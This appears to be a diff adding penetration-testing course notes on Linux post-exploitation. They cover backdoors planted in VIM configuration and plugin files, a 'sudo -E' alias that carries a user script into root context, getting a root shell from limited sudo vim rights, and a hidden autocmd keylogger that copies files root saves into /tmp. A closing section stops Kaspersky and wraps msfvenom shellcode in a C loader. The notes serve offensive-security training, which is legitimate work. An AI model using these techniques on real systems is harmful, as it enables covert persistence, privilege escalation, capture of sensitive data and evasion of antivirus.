+Note that the source call for loading a VIM configuration file is prepended with a **colon** and not an **exclamation point**, which is used for shell commands.
+
+As a more stealthy approach, leverage the **VIM plugin directory**. As long as the files have a `.vim` extension, all VIM config files located in the user's `~/.vim/plugin` directory will be loaded when VIM is run.
+
+The `:silent` command mutes any debug output which would normally be sent to the user when running VIM.
+
+`.vimrc` file
+
+`:silent !source ~/.vimrunscript`
+
+
+`/home/offsec/.vimrunscript` file
+
+```
+#!/bin/bash
+echo "hacked" > /tmp/hacksrcout.txt
+```
+
+We can gain root privileges if the user runs VIM as root or uses the `visudo` command
+
+VIM handles its configuration files differently for a user in a sudo context depending on the distribution of Linux.
+* On a Ubuntu or Red Hat: VIM will use the current user's `.vimrc` configuration file even in a sudo context.
+* On a Debian: In a sudo context, VIM will use the root user's VIM configuration.
+
+On a Debian or similar system that does not persist the user's shell environment information when moving to a sudo context, we can add an alias to the user's `.bashrc` file.
+
+`alias sudo="sudo -E"`
+
+Replaces a standard sudo call with one that will force sudo to persist the user's VIM settings. The shell script being loaded will then also run as root. We will need to source our `.bashrc` file from the command line if we want the alias changes to go into effect right away.
+
+```bash
+source ~/.bashrc
+```
+
+In some cases, users are given limited sudo rights to run only specific programs. 
+
+```bash
+sudo -l
+```
+
+`(root) NOPASSWD: /usr/bin/vim /opt/important.conf`
+
+This limited access can be set in the `/etc/sudoers` file with the same syntax as the highlighted line above. In this case, a password is not required for sudo access.
+
+We can run VIM and then enter `:shell` to gain a root shell automatically. If a password was required, use the alias vector to gain root access with our backdoor script.
+
+Note: many administrators now require the use of `sudoedit` for modifying sensitive files. This process makes copies of the files for the user to edit and then uses `sudo` to overwrite the old files. It also prevents the editor itself from running as sudo.
+
+### VIM Config Simple Keylogger
+
+Create a keylogger to log any changes a user makes to a file. => for capturing sensitive data in configuration files or scripts.
+
+`autocommand` settings are internal to VIM and do not require the shell (even if the current system uses a restricted VIM environment that blocks any shell commands).
+
+Use `:autocmd` in a VIM configuration file or in the editor to set actions for a collection of predefined events.
+
+E.g., VimEnter (entering VIM), VimLeave (leaving VIM), FileAppendPre (right before appending to a file), and BufWritePost (after writing a change buffer to a file).
+
+We don't want to risk preventing the user from actually saving their files as this might alert them. To avoid this, we can perform our actions based on the BufWritePost event. This activates once a buffer has already been written to the intended file.
+
+```
+:if $USER == "root"
+:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
+:endif
+```
+
+VIM supports the use of basic if statements in its configuration scripts in this manner.
+
+```
+:if <some condition>
+:<some command>
+:else
+:<some alternative command>
+:endif
+```
+
+Combining this with the ability to use environment variables, we can check whether the user is running as root.
+
+The "*" specifies that this action will be performed for all files being edited. We could change this to match only files with a particular name or file extension.
+
+We then use :w! to save the buffer contents.
+
+Put our command in `/home/offsec/.vim/plugin/settings.vim`.
+
+It's also possible to run shell commands on an autocommand trigger. Just replace everything after ":silent" with "!" followed by a shell script name or shell command. Note that in our current restricted environment, we can't use this approach.
+
+## Bypassing AV
+
+Turn Kaspersky off 
+
+```bash
+sudo kesl-control --stop-t 1
+```
+
+Decrypts the encrypted version of the EICAR file 
+
+```bash
+sudo gpg -d eicar.txt.gpg > eicar.txt
+```
+
+Run a scan on our EICAR test file
+
+```bash
+sudo kesl-control --scan-file ./eicar.txt
+```
+
+Query Kaspersky's event log
+
+```bash
+sudo kesl-control -E --query | grep DetectName
+```
+
+A 64-bit Meterpreter payload encoded with the x64/zutto_dekiru encoder is not detected by the AV.
+
+Restore real-time protection 
+
+```bash
+sudo kesl-control --start-t 1
+```
+
+Generate a 64-bit unencoded shellcode with msfvenom, with an output type of "c", then insert it in a C program, which will act as a wrapper to load and run the shellcode.
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+unsigned char buf[] = 
+"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
+...
+"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";
+
+int main (int argc, char **argv) 
+{
+    // Run our shellcode
+    int (*ret)() = (int(*)())buf;
+    ret();
+}
+```
+
+```bash
+gcc -o hack.out hack.c -z execstack
+./hack.out
+```
